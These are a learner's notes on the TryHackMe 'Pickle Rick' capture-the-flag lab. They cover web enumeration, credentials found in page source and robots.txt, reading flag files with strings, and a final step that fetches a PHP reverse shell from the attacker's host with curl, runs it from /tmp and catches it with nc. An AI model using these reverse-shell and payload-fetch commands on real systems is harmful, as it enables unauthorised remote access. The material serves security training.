<mark style="background: #BBFABBA6;">Web URL</mark>

started with url enumeration found a username on the source code of 

https://10-10-171-77.p.thmlabs.com/


<!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->



machine are running really slow, maybe its my connection


Found this on view-source:http://10-10-171-77.p.thmlabs.com/robots.txt


	Wubbalubbadubdub


Also found /assets but nothing more


<mark style="background: #BBFABBA6;">Nmap</mark>


root@ip-10-10-89-17:~# nmap -sT -sV 10.10.89.17

Starting Nmap 7.60 ( https://nmap.org ) at 2023-02-03 15:32 GMT
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 77.78% done; ETC: 15:33 (0:00:12 remaining)
Stats: 0:01:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 88.89% done; ETC: 15:34 (0:00:12 remaining)
Nmap scan report for ip-10-10-89-17.eu-west-1.compute.internal (10.10.89.17)
Host is up (0.00014s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          WebSockify Python/3.6.9
111/tcp  open  rpcbind       2-4 (RPC #100000)
389/tcp  open  ldap          OpenLDAP 2.2.X - 2.3.X
3389/tcp open  ms-wbt-server xrdp
5901/tcp open  vnc           VNC (protocol 3.8)
6001/tcp open  X11           (access denied)
7777/tcp open  cbt?
7778/tcp open  interwise?
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :


<mark style="background: #BBFABBA6;">Gave up and used the writeup to see what i missed</mark>

Following the writeup:

https://github.com/luisrodrigues154/Cyber-Security/blob/master/TryHackMe/PickleRick/notes.md





So there was a login page 

https://10-10-171-77.p.thmlabs.com/login.php


used the data we found till now to login and was successful

username: R1ckRul3s
password: Wubbalubbadubdub




so i also tried multiple commands and tried to view the files but was unsuccessful and followed the writeup

	cat Sup3rS3cretPickl3Ingred.txt
	Command disabled

	strings Sup3rS3cretPickl3Ingred.txt

	mr. meeseek hair


so i didtn even knew there was a command called strings - added to things learnt - [[Strings instead of cat to read a file]]

so now we got out first ingredient or flag

<mark style="background: #BBFABBA6;">Now for second ingredient</mark>

	strings clue.txt
got this

	Look around the file system for the other ingredient.

Follwed the write up

i used this command:

	cd /home && ls -al
followed with

	cd /home/rick && ls -al

followed with 
	strings /home/rick/second\ ingredients

and got the second ingredient:

1 jerry tear


<mark style="background: #BBFABBA6;">final ingredient</mark>

tried accessing the /root folder

So here we just host a server on our local machine. Host a reverse php sheel on it


and download it on the target machine(/tmp folder) and execute it

Local

```
cp /usr/share/webshells/php/php-reverse-shell.php revshell.php
python -m SimpleHTTPServer
```

Here since we are running on python 3 the comand to be used here is 

	python -m http.server

Remote

```
curl "http://10.9.128.84:8000/revshell.php" > /tmp/rev.php

strings /tmp/rev.php (just to check)
```

Now listen on the port that was set in the revshell file

```
nc -lnv 9999
```

Just exec the shell on the remote

```
php /tmp/rev.php &
```


followed the above steps and got the 3rd falg


here I also learned how to make a php reverse sheel and execute it

added to Things learnt